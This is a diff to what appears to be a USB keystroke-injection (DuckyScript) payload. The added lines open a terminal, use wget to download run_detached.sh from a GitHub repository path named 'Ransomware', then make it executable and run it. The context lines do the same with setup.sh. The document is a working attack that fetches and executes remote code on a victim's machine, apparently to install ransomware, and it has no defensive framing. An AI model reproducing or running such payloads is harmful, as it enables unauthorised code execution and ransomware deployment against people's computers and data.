@@ -3,6 +3,20 @@ CTRL ALT t
 DELAY 600
 GUI
 DELAY 700
+STRING cd ~/Desktop && wget https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch/run_detached.sh
+ENTER
+DELAY 700
+REM STRING chmod +x run_detached.sh && ./run_detached.sh ; exit
+STRING chmod +x run_detached.sh && ./run_detached.sh
+ENTER
+
+-------------------------------------------
+
+DELAY 800
+CTRL ALT t
+DELAY 600
+GUI
+DELAY 700
 STRING cd ~/Desktop && wget https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch/setup.sh
 ENTER
 DELAY 700
